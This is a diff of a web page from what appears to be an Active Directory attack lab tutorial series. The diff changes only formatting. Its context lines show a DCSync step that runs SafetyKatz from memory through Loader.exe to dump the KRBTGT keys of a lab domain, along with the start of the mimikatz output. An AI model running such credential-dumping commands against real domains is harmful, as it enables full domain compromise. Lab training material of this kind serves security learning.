@@ -356,7 +356,7 @@ Let’s now encode the argument(lsadump::dcsync) we will be using when putting S
 
 <p>Now that we have all setup, we can now run SafetyKatz.exe from memory using Loader.exe and request for KRBTGT’s keys.
 C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:techcorp\krbtgt /domain:techcorp.local" "exit"
-<pre><code>mimikatz(commandline) # lsadump::dcsync /user:techcorp\krbtgt /domain:techcorp.local
+<pre><code class="language-bash">mimikatz(commandline) # lsadump::dcsync /user:techcorp\krbtgt /domain:techcorp.local
 [DC] 'techcorp.local' will be the domain
 [DC] 'Techcorp-DC.techcorp.local' will be the DC server
 [DC] 'techcorp\krbtgt' will be the user account
@@ -460,7 +460,7 @@ Bye!
 
 
 
-          <div class="part-navigation">
+<div class="part-navigation">
             <a href="part-21-shadow-credentials-abusing-user-object.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: Shadow Credentials - Abusing U</a>
             <a href="part-23-cross-domain-attacks-attacking-azure-ad-integratio.html">Next: Cross Domain Attacks - Attacki <ion-icon name="arrow-forward-outline"></ion-icon></a>
           </div>
